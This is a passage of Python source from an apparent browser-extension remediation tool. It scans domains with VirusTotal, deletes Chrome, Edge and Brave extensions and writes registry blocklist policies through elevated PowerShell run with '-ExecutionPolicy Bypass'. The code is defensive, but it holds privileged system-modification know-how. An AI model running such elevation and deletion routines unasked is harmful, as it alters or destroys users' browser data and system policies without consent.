                # On 429 rate limit, wait and retry once
                if "429" in str(e):
                    time.sleep(60)
                    try:
                        req = Request(f"https://www.virustotal.com/api/v3/{api_ext}/{host}", headers=headers)
                        resp = urlopen(req, timeout=15)
                        data = json.loads(resp.read().decode())
                        stats = data.get("data", {}).get("attributes", {}).get("last_analysis_stats", {})
                        entry["vt_result"] = {
                            "malicious": stats.get("malicious", 0),
                            "suspicious": stats.get("suspicious", 0),
                            "undetected": stats.get("undetected", 0),
                            "harmless": stats.get("harmless", 0),
                            "link": f"https://www.virustotal.com/gui/search/{host.strip()}"
                        }
                    except Exception as e2:
                        entry["vt_result"] = {"error": str(e2)}
                else:
                    entry["vt_result"] = {"error": str(e)}
            results["domain_results"].append(entry)

        return results

    def find_extension_by_id(self, ext_id: str) -> List[Extension]:
        """Find extension(s) by ID across all supported browsers"""
        if not self.extensions_cache:
            self.scan_extensions()
        eid = str(ext_id).strip()
        return [e for e in self.extensions_cache if e.id == eid]

    def extension_display_name_for_id(self, ext_id: str) -> str:
        """Best-effort name for an extension ID (scan cache, then Web Store cache)."""
        eid = str(ext_id).strip()
        if not self.extensions_cache:
            self.scan_extensions()
        for e in self.extensions_cache:
            if e.id == eid and e.name:
                return e.name
        meta = self._webstore_meta_by_id.get(eid) or {}
        if isinstance(meta, dict):
            t = meta.get("title") or meta.get("name")
            if t:
                return str(t)
        return ""

    def _display_name_for_blocklist_policy(self, ext: Extension) -> str:
        """Prefer Web Store title, then resolved name; avoid unlocalized __MSG_ placeholders."""
        eid = str(ext.id).strip()
        meta = self._webstore_meta_by_id.get(eid) or {}
        if isinstance(meta, dict):
            t = (meta.get("title") or meta.get("name") or "").strip()
            if t:
                return t
        raw = (getattr(ext, "name", None) or "").strip()
        if raw and not raw.startswith("__MSG_"):
            return raw
        for e in self.extensions_cache:
            if e.id == eid:
                x = (getattr(e, "name", None) or "").strip()
                if x and not x.startswith("__MSG_"):
                    return x
        return raw or ""

    def remove_extension(self, extension: Extension) -> CleanupResult:
        """Remove a specific extension"""
        try:
            if extension.path.exists():
                if extension.path.is_dir():
                    shutil.rmtree(extension.path)
                else:
                    extension.path.unlink()
                
                self.log(f"Removed: {extension.name} ({extension.id}) from {extension.browser}/{extension.profile}")
                return CleanupResult(True, "remove_extension", 
                    f"Removed {extension.name} ({extension.id})", 1)
            else:
                return CleanupResult(True, "remove_extension", "Extension path not found", 0)
        except Exception as e:
            return CleanupResult(False, "remove_extension", str(e))
    
    def clean_extension_from_preferences(self, extension: Extension) -> CleanupResult:
        """Remove extension entry from Preferences and Secure Preferences files.
        
        WARNING: Editing Secure Preferences will trigger Chrome's HMAC integrity
        check, showing a one-time "Something went wrong" recovery prompt on next launch.
        """
        ext_id = extension.id
        profile_path = extension.path
        # Navigate up to the profile directory (path is usually .../Extensions/<id>/<version>)
        # We need to find the profile root which contains Preferences
        while profile_path and profile_path.name != "Extensions" and profile_path.parent != profile_path:
            profile_path = profile_path.parent
        if profile_path.name == "Extensions":
            profile_path = profile_path.parent
        else:
            return CleanupResult(False, "clean_preferences", "Could not determine profile path")
        
        cleaned = 0
        for prefs_name in ["Preferences", "Secure Preferences"]:
            prefs_path = profile_path / prefs_name
            if not prefs_path.exists():
                continue
            try:
                with open(prefs_path, 'r', encoding='utf-8') as f:
                    prefs = json.load(f)
                settings = prefs.get('extensions', {}).get('settings', {})
                if ext_id in settings:
                    del settings[ext_id]
                    with open(prefs_path, 'w', encoding='utf-8') as f:
                        json.dump(prefs, f, separators=(',', ':'))
                    self.log(f"  Cleaned {ext_id} from {extension.profile}/{prefs_name}")
                    cleaned += 1
            except Exception as e:
                self.log(f"  Could not clean {prefs_name}: {e}")
        
        if cleaned:
            return CleanupResult(True, "clean_preferences",
                f"Removed {ext_id} from {cleaned} preferences file(s)", cleaned)
        return CleanupResult(True, "clean_preferences", "No preferences entries found", 0)
    
    def remove_extensions_by_ids(
        self,
        ext_ids: List[str],
        disable_sync: bool = True,
        clean_preferences: bool = False,
        apply_blocklist: bool = True,
        allow_blocklist_elevation: bool = True,
    ) -> List[CleanupResult]:
        """Remove extensions by ID; policy blocklist + ExtensionSettings batched (one UAC on Windows)."""
        results: List[CleanupResult] = []
        block_tasks: List[Tuple[str, str, Optional[str]]] = []
        sync_tasks: List[Tuple[str, str, Optional[str]]] = []
        # Invalidate cache so removals match current on-disk installs (e.g. Brave vs Edge).
        self.extensions_cache = []

        for ext_id in ext_ids:
            extensions = self.find_extension_by_id(ext_id)
            if not extensions:
                self.log(f"Extension {ext_id} not found")
                results.append(CleanupResult(True, "remove_extension", "Extension not found", 0))
                continue

            for ext in extensions:
                result = self.remove_extension(ext)
                results.append(result)
                if disable_sync and result.success and not apply_blocklist:
                    sync_tasks.append((ext.browser, ext.id, None))
                if apply_blocklist and result.success:
                    block_tasks.append(
                        (
                            ext.browser,
                            ext.id,
                            self._display_name_for_blocklist_policy(ext),
                        )
                    )
                if clean_preferences and result.success:
                    prefs_result = self.clean_extension_from_preferences(ext)
                    results.append(prefs_result)

        if apply_blocklist and block_tasks:
            results.extend(
                self._apply_policy_blocklist_tasks(
                    block_tasks, allow_elevation=allow_blocklist_elevation
                )
            )
        elif sync_tasks:
            results.extend(
                self._apply_policy_blocklist_tasks(
                    sync_tasks, allow_elevation=allow_blocklist_elevation
                )
            )

        return results

    def remove_extension_by_id(
        self,
        ext_id: str,
        disable_sync: bool = True,
        clean_preferences: bool = False,
        apply_blocklist: bool = True,
        allow_blocklist_elevation: bool = True,
    ) -> List[CleanupResult]:
        """Remove extension by ID from all supported browsers where it exists."""
        return self.remove_extensions_by_ids(
            [ext_id],
            disable_sync=disable_sync,
            clean_preferences=clean_preferences,
            apply_blocklist=apply_blocklist,
            allow_blocklist_elevation=allow_blocklist_elevation,
        )
    
    BROWSER_POLICY_REGISTRY = {
        "chrome": r"SOFTWARE\Policies\Google\Chrome",
        "edge": r"SOFTWARE\Policies\Microsoft\Edge",
        "brave": r"SOFTWARE\Policies\BraveSoftware\Brave",
    }
    BROWSER_POLICY_MAC_DOMAIN = {
        "chrome": "com.google.Chrome",
        "edge": "com.microsoft.Edge",
        "brave": "com.brave.Browser",
    }
    BROWSER_POLICY_LINUX_DIR = {
        "chrome": "/etc/opt/chrome/policies/managed",
        "edge": "/etc/opt/edge/policies/managed",
        "brave": "/etc/brave/policies/managed",
    }

    def _windows_policy_reg_bases(self, bkey: str) -> List[str]:
        """HKCU/HKLM parent paths for managed policies. Brave may honor Brave or Brave-Browser roots."""
        bkey = str(bkey).lower().strip()
        main = self.BROWSER_POLICY_REGISTRY.get(bkey)
        if not main:
            return []
        if bkey == "brave":
            alt = r"SOFTWARE\Policies\BraveSoftware\Brave-Browser"
            if main.rstrip("\\").lower() != alt.rstrip("\\").lower():
                return [main, alt]
        return [main]

    def _windows_blocklist_registry_app_paths(self) -> Dict[str, List[str]]:
        """Per logical browser, registry path segments under SOFTWARE\\Policies\\ for blocklist keys."""
        return {
            "chrome": ["Google\\Chrome"],
            "edge": ["Microsoft\\Edge"],
            "brave": ["BraveSoftware\\Brave", "BraveSoftware\\Brave-Browser"],
        }

    # Stable registry value name (unchanged for compatibility with existing installs).
    REMEDEX_BLOCKLIST_NAMES_VALUE = "RemedexBlocklistNames"

    def _remedex_merge_blocklist_display_name(
        self, hive, reg_base: str, ext_id: str, display_name: str
    ) -> None:
        """Persist friendly name for blocklist UI (not read by Chromium)."""
        if not display_name or not str(display_name).strip():
            return
        import winreg
        wa = _winreg_policy_access_write()
        key = winreg.CreateKeyEx(hive, reg_base, 0, wa)
        try:
            raw = None
            try:
                raw, _ = winreg.QueryValueEx(key, self.REMEDEX_BLOCKLIST_NAMES_VALUE)
            except OSError:
                pass
            data: Dict[str, Any] = {}
            if raw:
                try:
                    parsed = json.loads(raw)
                    if isinstance(parsed, dict):
                        data = parsed
                except json.JSONDecodeError:
                    pass
            eid = str(ext_id).strip()
            data[eid] = str(display_name).strip()[:500]
            winreg.SetValueEx(
                key, self.REMEDEX_BLOCKLIST_NAMES_VALUE, 0, winreg.REG_SZ,
                json.dumps(data, separators=(",", ":")),
            )
        finally:
            winreg.CloseKey(key)

    def blocklist_display_name(self, browser_key: str, ext_id: str) -> str:
        """Name for blocklist UI: registry (RemedeX metadata), then scan/Web Store."""
        eid = str(ext_id).strip()
        bk = str(browser_key).lower().strip()
        if self.system == "Windows":
            import winreg
            for app in self._windows_blocklist_registry_app_paths().get(bk, []):
                reg_base = f"SOFTWARE\\Policies\\{app}"
                for hive in (winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE):
                    try:
                        key = winreg.OpenKey(hive, reg_base, 0, _winreg_policy_access_read())
                        try:
                            raw, _ = winreg.QueryValueEx(key, self.REMEDEX_BLOCKLIST_NAMES_VALUE)
                        finally:
                            winreg.CloseKey(key)
                        data = json.loads(raw)
                        if isinstance(data, dict) and eid in data and data[eid]:
                            return str(data[eid])
                    except (OSError, json.JSONDecodeError, TypeError, KeyError):
                        pass
        rest = self.extension_display_name_for_id(eid)
        return rest if rest else ""

    def _windows_strip_extension_settings_id(self, hive, reg_base: str, ext_id: str) -> bool:
        """Remove ext_id from ExtensionSettings JSON; delete value if empty."""
        import winreg
        eid = str(ext_id).strip()
        try:
            key = winreg.OpenKey(hive, reg_base, 0, _winreg_policy_access_write())
        except OSError:
            return False
        changed = False
        try:
            try:
                raw, _ = winreg.QueryValueEx(key, "ExtensionSettings")
            except OSError:
                return False
            try:
                data = json.loads(raw)
            except json.JSONDecodeError:
                return False
            if not isinstance(data, dict) or eid not in data:
                return False
            del data[eid]
            changed = True
            if not data:
                try:
                    winreg.DeleteValue(key, "ExtensionSettings")
                except OSError:
                    pass
            else:
                winreg.SetValueEx(
                    key, "ExtensionSettings", 0, winreg.REG_SZ,
                    json.dumps(data, separators=(",", ":")),
                )
            return changed
        finally:
            winreg.CloseKey(key)

    def _windows_strip_remedex_display_name(self, hive, reg_base: str, ext_id: str) -> bool:
        import winreg
        eid = str(ext_id).strip()
        try:
            key = winreg.OpenKey(hive, reg_base, 0, _winreg_policy_access_write())
        except OSError:
            return False
        try:
            try:
                raw, _ = winreg.QueryValueEx(key, self.REMEDEX_BLOCKLIST_NAMES_VALUE)
            except OSError:
                return False
            try:
                data = json.loads(raw)
            except json.JSONDecodeError:
                return False
            if not isinstance(data, dict) or eid not in data:
                return False
            del data[eid]
            if not data:
                try:
                    winreg.DeleteValue(key, self.REMEDEX_BLOCKLIST_NAMES_VALUE)
                except OSError:
                    pass
            else:
                winreg.SetValueEx(
                    key, self.REMEDEX_BLOCKLIST_NAMES_VALUE, 0, winreg.REG_SZ,
                    json.dumps(data, separators=(",", ":")),
                )
            return True
        finally:
            winreg.CloseKey(key)

    def _windows_prune_blocked_extension_settings(self, hive, reg_base: str) -> bool:
        """Remove all extension IDs with installation_mode blocked from ExtensionSettings."""
        import winreg
        try:
            key = winreg.OpenKey(hive, reg_base, 0, _winreg_policy_access_write())
        except OSError:
            return False
        try:
            try:
                raw, _ = winreg.QueryValueEx(key, "ExtensionSettings")
            except OSError:
                return False
            try:
                data = json.loads(raw)
            except json.JSONDecodeError:
                return False
            if not isinstance(data, dict):
                return False
            to_del = [
                k for k, v in data.items()
                if isinstance(v, dict) and v.get("installation_mode") == "blocked"
            ]
            if not to_del:
                return False
            for k in to_del:
                del data[k]
            if not data:
                try:
                    winreg.DeleteValue(key, "ExtensionSettings")
                except OSError:
                    pass
            else:
                winreg.SetValueEx(
                    key, "ExtensionSettings", 0, winreg.REG_SZ,
                    json.dumps(data, separators=(",", ":")),
                )
            return True
        finally:
            winreg.CloseKey(key)

    def _windows_policy_apply_blocklist_one_base(
        self, reg_base: str, ext_id: str, display_name: Optional[str] = None
    ) -> Tuple[bool, int, Optional[OSError]]:
        """Write blocklist + ExtensionSettings for one policy root. Returns (ok, new_values_added 0|1, last_error)."""
        import winreg
        blocklist_key = reg_base + r"\ExtensionInstallBlocklist"
        wa = _winreg_policy_access_write()

        def _create_blocklist_key(hive):
            last_e = None
            for access in (wa, winreg.KEY_ALL_ACCESS):
                try:
                    return winreg.CreateKeyEx(hive, blocklist_key, 0, access)
                except OSError as e:
                    last_e = e
            if last_e:
                raise last_e
            raise OSError("CreateKeyEx failed for blocklist key")

        last_err: Optional[OSError] = None
        for hive in (winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE):
            try:
                key = _create_blocklist_key(hive)
                next_idx = 1
                try:
                    i = 0
                    while True:
                        name, value, _ = winreg.EnumValue(key, i)
                        if value and str(value).strip() == str(ext_id).strip():
                            winreg.CloseKey(key)
                            try:
                                self._win_merge_extension_settings(hive, reg_base, ext_id)
                            except OSError as mex:
                                self.log(f"  ExtensionSettings merge: {mex}")
                            if display_name:
                                try:
                                    self._remedex_merge_blocklist_display_name(
                                        hive, reg_base, ext_id, display_name)
                                except OSError as nex:
                                    self.log(f"  RemedeX display name: {nex}")
                            return True, 0, None
                        if name.isdigit():
                            next_idx = max(next_idx, int(name) + 1)
                        i += 1
                except OSError:
                    pass
                winreg.SetValueEx(key, str(next_idx), 0, winreg.REG_SZ, ext_id)
                try:
                    written, _ = winreg.QueryValueEx(key, str(next_idx))
                except OSError as e:
                    winreg.CloseKey(key)
                    raise OSError(f"Could not read back blocklist value: {e}") from e
                if str(written).strip() != str(ext_id).strip():
                    winreg.CloseKey(key)
                    raise OSError("Registry verify failed after write")
                winreg.CloseKey(key)
                try:
                    self._win_merge_extension_settings(hive, reg_base, ext_id)
                except OSError as mex:
                    self.log(f"  ExtensionSettings merge: {mex}")
                if display_name:
                    try:
                        self._remedex_merge_blocklist_display_name(
                            hive, reg_base, ext_id, display_name)
                    except OSError as nex:
                        self.log(f"  RemedeX display name: {nex}")
                return True, 1, None
            except OSError as e:
                last_err = e
                continue
        return False, 0, last_err

    def _win_merge_extension_settings(self, hive, reg_base: str, ext_id: str) -> None:
        """Set ExtensionSettings REG_SZ JSON with installation_mode:blocked (Chromium-enforced policy)."""
        import winreg
        wa = _winreg_policy_access_write()
        key = winreg.CreateKeyEx(hive, reg_base, 0, wa)
        try:
            raw = None
            try:
                raw, _ = winreg.QueryValueEx(key, "ExtensionSettings")
            except OSError:
                pass
            data: Dict[str, Any] = {}
            if raw:
                try:
                    parsed = json.loads(raw)
                    if isinstance(parsed, dict):
                        data = parsed
                except json.JSONDecodeError:
                    pass
            eid = ext_id.strip()
            data[eid] = {"installation_mode": "blocked"}
            winreg.SetValueEx(
                key, "ExtensionSettings", 0, winreg.REG_SZ,
                json.dumps(data, separators=(",", ":")),
            )
        finally:
            winreg.CloseKey(key)

    def policy_blocklist_registry_status_windows(self, browser: str) -> str:
        """Read-only snapshot of parent + ExtensionInstallBlocklist keys (HKLM and HKCU)."""
        if sys.platform != "win32":
            return "Not applicable (not Windows)."
        import winreg
        bkey = str(browser).lower().strip()
        bases = self._windows_policy_reg_bases(bkey)
        if not bases:
            return f"No policy registry mapping for browser: {browser!r}"
        ra = _winreg_policy_access_read()
        lines = [
            f"{bkey}: policy registry (64-bit view)",
            "  Note: HKCU is tried first for writes (works without Administrator).",
        ]
        for bi, reg_base in enumerate(bases):
            if len(bases) > 1:
                lines.append(f"  --- Policy root {bi + 1}/{len(bases)} ---")
            blocklist_key = reg_base + r"\ExtensionInstallBlocklist"
            for hive, hname in [(winreg.HKEY_LOCAL_MACHINE, "HKLM"), (winreg.HKEY_CURRENT_USER, "HKCU")]:
                try:
                    winreg.OpenKey(hive, reg_base, 0, ra)
                    parent = "present"
                except OSError:
                    parent = "MISSING"
                lines.append(f"  {hname}\\...\\{reg_base}: {parent}")
                try:
                    k = winreg.OpenKey(hive, blocklist_key, 0, ra)
                    winreg.CloseKey(k)
                    bl = "present"
                except OSError:
                    bl = "MISSING (will be created on successful write)"
                lines.append(f"  {hname}\\...\\ExtensionInstallBlocklist: {bl}")
                try:
                    pk = winreg.OpenKey(hive, reg_base, 0, ra)
                    try:
                        try:
                            winreg.QueryValueEx(pk, "ExtensionSettings")
                            es = "present (JSON; installation_mode:blocked per ID)"
                        except OSError:
                            es = "not set (needed for reliable store block)"
                    finally:
                        winreg.CloseKey(pk)
                except OSError:
                    es = "(parent key not readable)"
                lines.append(f"  {hname}\\... ExtensionSettings: {es}")
        return "\n".join(lines)

    def _windows_elevated_policies_batch(self, ops: List[Tuple[str, str, Optional[str]]]) -> CleanupResult:
        """One UAC: write ExtensionInstallBlocklist + ExtensionSettings for all (browser, id) pairs."""
        if sys.platform != "win32":
            return CleanupResult(False, "policy_blocklist", "Not Windows")
        if not ops:
            return CleanupResult(True, "policy_blocklist", "No policy operations", 0)
        clean: List[Dict[str, str]] = []
        for bkey, ext_id, disp in _dedupe_policy_tasks_with_names(ops):
            if bkey not in self.BROWSER_POLICY_REGISTRY:
                return CleanupResult(False, "policy_blocklist", f"Unknown browser {bkey!r}")
            eid = ext_id.strip()
            if not _extension_id_safe_for_ps(eid):
                return CleanupResult(False, "policy_blocklist", f"Invalid extension ID for policy: {eid!r}")
            clean.append({
                "browser": bkey,
                "ext_id": eid,
                "name": (disp or "").strip(),
            })

        ps_inner = r'''param([Parameter(Mandatory=$true)][string]$JsonPath)
$ErrorActionPreference = 'Stop'
$payload = Get-Content -Raw -Encoding UTF8 $JsonPath | ConvertFrom-Json
$MapChrome = @{ Block = 'SOFTWARE\Policies\Google\Chrome\ExtensionInstallBlocklist'; Parent = 'SOFTWARE\Policies\Google\Chrome' }
$MapEdge = @{ Block = 'SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallBlocklist'; Parent = 'SOFTWARE\Policies\Microsoft\Edge' }
$BraveMaps = @(
  @{ Block = 'SOFTWARE\Policies\BraveSoftware\Brave\ExtensionInstallBlocklist'; Parent = 'SOFTWARE\Policies\BraveSoftware\Brave' },
  @{ Block = 'SOFTWARE\Policies\BraveSoftware\Brave-Browser\ExtensionInstallBlocklist'; Parent = 'SOFTWARE\Policies\BraveSoftware\Brave-Browser' }
)
function Apply-One {
  param(
    [Microsoft.Win32.RegistryHive]$Hive,
    [string]$BlockRel,
    [string]$ParentRel,
    [string]$ExtId
  )
  $view = [Microsoft.Win32.RegistryView]::Registry64
  $base = [Microsoft.Win32.RegistryKey]::OpenBaseKey($Hive, $view)
  try {
    $blk = $base.CreateSubKey($BlockRel, $true)
    try {
      $found = $false
      foreach ($n in $blk.GetValueNames()) {
        $v = $blk.GetValue($n)
        if ($null -ne $v -and ($v.ToString().Trim() -eq $ExtId)) { $found = $true; break }
      }
      if (-not $found) {
        $max = 0
        foreach ($n in $blk.GetValueNames()) {
          if ($n -match '^\d+$') { $i = [int]$n; if ($i -gt $max) { $max = $i } }
        }
        $next = $max + 1
        $blk.SetValue("$next", $ExtId, [Microsoft.Win32.RegistryValueKind]::String)
        $w = $blk.GetValue("$next")
        if ($null -eq $w -or ($w.ToString().Trim() -ne $ExtId)) { throw 'blocklist verify failed' }
      }
    } finally { $blk.Dispose() }
    $par = $base.CreateSubKey($ParentRel, $true)
    try {
      $raw = $null
      try { $raw = $par.GetValue('ExtensionSettings') } catch { }
      $jsonText = if ($raw) { $raw.ToString().Trim() } else { '{}' }
      if ([string]::IsNullOrWhiteSpace($jsonText)) { $jsonText = '{}' }
      $obj = $jsonText | ConvertFrom-Json
      $dict = @{}
      if ($null -ne $obj) {
        $obj.PSObject.Properties | ForEach-Object { $dict[$_.Name] = $_.Value }
      }
      $dict[$ExtId] = @{ installation_mode = 'blocked' }
      $out = ($dict | ConvertTo-Json -Compress -Depth 10)
      $par.SetValue('ExtensionSettings', $out, [Microsoft.Win32.RegistryValueKind]::String)
    } finally { $par.Dispose() }
  } finally { $base.Dispose() }
}
function Merge-RemedexDisplayName {
  param(
    [Microsoft.Win32.RegistryHive]$Hive,
    [string]$ParentRel,
    [string]$ExtId,
    [string]$DisplayName
  )
  if ([string]::IsNullOrWhiteSpace($DisplayName)) { return }
  $view = [Microsoft.Win32.RegistryView]::Registry64
  $base = [Microsoft.Win32.RegistryKey]::OpenBaseKey($Hive, $view)
  try {
    $par = $base.CreateSubKey($ParentRel, $true)
    try {
      $raw = $null
      try { $raw = $par.GetValue('RemedexBlocklistNames') } catch { }
      $jsonText = if ($raw) { $raw.ToString().Trim() } else { '{}' }
      if ([string]::IsNullOrWhiteSpace($jsonText)) { $jsonText = '{}' }
      $obj = $jsonText | ConvertFrom-Json
      $dict = @{}
      if ($null -ne $obj) { $obj.PSObject.Properties | ForEach-Object { $dict[$_.Name] = $_.Value } }
      $dict[$ExtId] = $DisplayName
      $out = ($dict | ConvertTo-Json -Compress -Depth 5)
      $par.SetValue('RemedexBlocklistNames', $out, [Microsoft.Win32.RegistryValueKind]::String)
    } finally { $par.Dispose() }
  } finally { $base.Dispose() }
}
$failed = @()
foreach ($op in $payload.ops) {
  if ($op.browser -eq 'chrome') { $maps = @($MapChrome) }
  elseif ($op.browser -eq 'edge') { $maps = @($MapEdge) }
  elseif ($op.browser -eq 'brave') { $maps = $BraveMaps }
  else { $failed += $op; continue }
  $opOk = $false
  $dn = ''
  if ($null -ne $op.name) { $dn = $op.name.ToString().Trim() }
  foreach ($m in $maps) {
    foreach ($hive in @([Microsoft.Win32.RegistryHive]::CurrentUser, [Microsoft.Win32.RegistryHive]::LocalMachine)) {
      try {
        Apply-One -Hive $hive -BlockRel $m.Block -ParentRel $m.Parent -ExtId $op.ext_id
        if (-not [string]::IsNullOrWhiteSpace($dn)) {
          Merge-RemedexDisplayName -Hive $hive -ParentRel $m.Parent -ExtId $op.ext_id -DisplayName $dn
        }
        $opOk = $true
        break
      } catch {
      }
    }
  }
  if (-not $opOk) { $failed += $op }
}
if ($failed.Count -gt 0) {
  [Console]::Error.WriteLine(($failed | ConvertTo-Json -Compress -Depth 5))
  exit 1
}
exit 0
'''
        wrapper_ps = r'''param([Parameter(Mandatory=$true)][string]$InnerPath, [Parameter(Mandatory=$true)][string]$JsonPath)
$p = Start-Process -FilePath powershell.exe -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',$InnerPath,$JsonPath -Verb RunAs -PassThru -Wait
if ($null -eq $p) { exit 1 }
exit $p.ExitCode
'''
        import tempfile
        inner_path = None
        wrap_path = None
        json_path = None
        try:
            json_fd, json_path = tempfile.mkstemp(suffix="_remedex_pol.json")
            with os.fdopen(json_fd, "w", encoding="utf-8") as jf:
                json.dump({"ops": clean}, jf, ensure_ascii=False)
            json_path = str(Path(json_path).resolve())

            inner_fd, inner_path = tempfile.mkstemp(suffix="_remedex_pol.ps1")
            wrap_fd, wrap_path = tempfile.mkstemp(suffix="_remedex_wrap.ps1")
            with os.fdopen(inner_fd, "w", encoding="utf-8") as f:
                f.write(ps_inner)
            with os.fdopen(wrap_fd, "w", encoding="utf-8") as f:
                f.write(wrapper_ps)
            inner_path = str(Path(inner_path).resolve())
            wrap_path = str(Path(wrap_path).resolve())
            cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
            r = subprocess.run(
                [
                    "powershell",
                    "-NoProfile",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-File",
                    wrap_path,
                    inner_path,
                    json_path,
                ],
                capture_output=True,
                text=True,
                creationflags=cf,
            )
            if r.returncode == 0:
                self.log("  Policy blocklist + ExtensionSettings written via elevated PowerShell (batch)")
                import winreg
                for op in clean:
                    nm = (op.get("name") or "").strip()
                    if not nm:
                        continue
                    bkey = op.get("browser") or ""
                    eid = (op.get("ext_id") or "").strip()
                    if not bkey or not eid:
                        continue
                    for reg_base in self._windows_policy_reg_bases(str(bkey).lower().strip()):
                        for hive in (winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE):
                            try:
                                self._remedex_merge_blocklist_display_name(
                                    hive, reg_base, eid, nm)
                            except OSError:
                                pass
                return CleanupResult(
                    True,
                    "policy_blocklist",
                    "Blocked extensions via policy (Administrator / UAC): blocklist + ExtensionSettings",
                    len(clean),
                )
            tail = ((r.stderr or "") + (r.stdout or ""))[-800:]
            return CleanupResult(
                False,
                "policy_blocklist",
                f"Elevated policy write failed (exit {r.returncode}). {tail}".strip(),
            )
        except Exception as ex:
            return CleanupResult(False, "policy_blocklist", f"Elevated policy batch failed: {ex}")
        finally:
            for p in (inner_path, wrap_path, json_path):
                if p:
                    try:
                        os.unlink(p)
                    except OSError:
                        pass

    def _windows_run_elevated_powershell(
        self,
        inner_script: str,
        *,
        json_payload: Optional[dict] = None,
    ) -> bool:
        """Run a PowerShell script elevated (UAC). If json_payload is set, pass path as -File arg after script."""
        if sys.platform != "win32":
            return False
        import tempfile
        inner_path = None
        wrap_path = None
        json_path = None
        try:
            if json_payload is not None:
                json_fd, json_path = tempfile.mkstemp(suffix="_remedex_elev.json")
                with os.fdopen(json_fd, "w", encoding="utf-8") as jf:
                    json.dump(json_payload, jf, ensure_ascii=False)
                json_path = str(Path(json_path).resolve())
                full_inner = (
                    "param([Parameter(Mandatory=$true)][string]$JsonPath)\n" + inner_script
                )
                wrapper_ps = (
                    "param([Parameter(Mandatory=$true)][string]$InnerPath, "
                    "[Parameter(Mandatory=$true)][string]$JsonPath)\n"
                    "$p = Start-Process -FilePath powershell.exe "
                    "-ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',$InnerPath,$JsonPath "
                    "-Verb RunAs -PassThru -Wait\n"
                    "if ($null -eq $p) { exit 1 }\n"
                    "exit $p.ExitCode\n"
                )
            else:
                full_inner = inner_script
                wrapper_ps = (
                    "param([Parameter(Mandatory=$true)][string]$InnerPath)\n"
                    "$p = Start-Process -FilePath powershell.exe "
                    "-ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',$InnerPath "
                    "-Verb RunAs -PassThru -Wait\n"
                    "if ($null -eq $p) { exit 1 }\n"
                    "exit $p.ExitCode\n"
                )

            inner_fd, inner_path = tempfile.mkstemp(suffix="_remedex_elev.ps1")
            wrap_fd, wrap_path = tempfile.mkstemp(suffix="_remedex_elev_wrap.ps1")
            with os.fdopen(inner_fd, "w", encoding="utf-8") as f:
                f.write(full_inner)
            with os.fdopen(wrap_fd, "w", encoding="utf-8") as f:
                f.write(wrapper_ps)
            inner_path = str(Path(inner_path).resolve())
            wrap_path = str(Path(wrap_path).resolve())
            cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
            cmd = [
                "powershell",
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-File",
                wrap_path,
                inner_path,
            ]
            if json_path:
                cmd.append(json_path)
            r = subprocess.run(cmd, capture_output=True, text=True, creationflags=cf)
            if r.returncode != 0:
                tail = ((r.stderr or "") + (r.stdout or ""))[-600:]
                self.log(f"Elevated PowerShell exit {r.returncode}: {tail}")
            return r.returncode == 0
        except Exception as ex:
            self.log(f"Elevated PowerShell failed: {ex}")
            return False
        finally:
            for p in (inner_path, wrap_path, json_path):
                if p:
                    try:
                        os.unlink(p)
                    except OSError:
                        pass

    def _registry_blocklist_still_has_id(self, ext_id: str) -> bool:
        eid = str(ext_id).strip()
        bl = self.get_blocklist()
        for ids in bl.values():
            if eid in ids:
                return True
        return False

    def _windows_elevated_unblock_extension(self, ext_id: str) -> bool:
        """HKLM / protected keys need Administrator — mirror unblock in elevated PS."""
        if not _extension_id_safe_for_ps(ext_id):
            return False
        eid = ext_id.strip()
        ps = r'''
$payload = Get-Content -Raw -Encoding UTF8 $JsonPath | ConvertFrom-Json
$ExtId = $payload.ext_id.Trim()
$apps = @(
  'Google\Chrome',
  'Microsoft\Edge',
  'BraveSoftware\Brave',
  'BraveSoftware\Brave-Browser'
)
function Remove-BlockArtifacts {
  param([Microsoft.Win32.RegistryHive]$Hive, [string]$App)
  $view = [Microsoft.Win32.RegistryView]::Registry64
  $base = [Microsoft.Win32.RegistryKey]::OpenBaseKey($Hive, $view)
  try {
    $blockRel = "SOFTWARE\Policies\$App\ExtensionInstallBlocklist"
    try {
      $sub = $base.OpenSubKey($blockRel, $true)
      if ($null -ne $sub) {
        try {
          foreach ($vn in @($sub.GetValueNames())) {
            $v = $sub.GetValue($vn)
            if ($null -ne $v -and ($v.ToString().Trim() -eq $ExtId)) {
              $sub.DeleteValue($vn)
            }
          }
        } finally { $sub.Dispose() }
      }
    } catch {}
    $parentRel = "SOFTWARE\Policies\$App"
    try {
      $par = $base.OpenSubKey($parentRel, $true)
      if ($null -ne $par) {
        try {
          $raw = $null
          try { $raw = $par.GetValue('ExtensionSettings') } catch {}
          if ($null -ne $raw) {
            $jsonText = $raw.ToString().Trim()
            if ([string]::IsNullOrWhiteSpace($jsonText)) { $jsonText = '{}' }
            $obj = $jsonText | ConvertFrom-Json
            $dict = @{}
            if ($null -ne $obj) { $obj.PSObject.Properties | ForEach-Object { $dict[$_.Name] = $_.Value } }
            if ($dict.ContainsKey($ExtId)) {
              [void]$dict.Remove($ExtId)
              if ($dict.Count -eq 0) {
                try { $par.DeleteValue('ExtensionSettings') } catch {}
              } else {
                $out = ($dict | ConvertTo-Json -Compress -Depth 10)
                $par.SetValue('ExtensionSettings', $out, [Microsoft.Win32.RegistryValueKind]::String)
              }
            }
          }
          $nraw = $null
          try { $nraw = $par.GetValue('RemedexBlocklistNames') } catch {}
          if ($null -ne $nraw) {
            $jsonText = $nraw.ToString().Trim()
            if ([string]::IsNullOrWhiteSpace($jsonText)) { $jsonText = '{}' }
            $obj = $jsonText | ConvertFrom-Json
            $dict = @{}
            if ($null -ne $obj) { $obj.PSObject.Properties | ForEach-Object { $dict[$_.Name] = $_.Value } }
            if ($dict.ContainsKey($ExtId)) {
              [void]$dict.Remove($ExtId)
              if ($dict.Count -eq 0) {
                try { $par.DeleteValue('RemedexBlocklistNames') } catch {}
              } else {
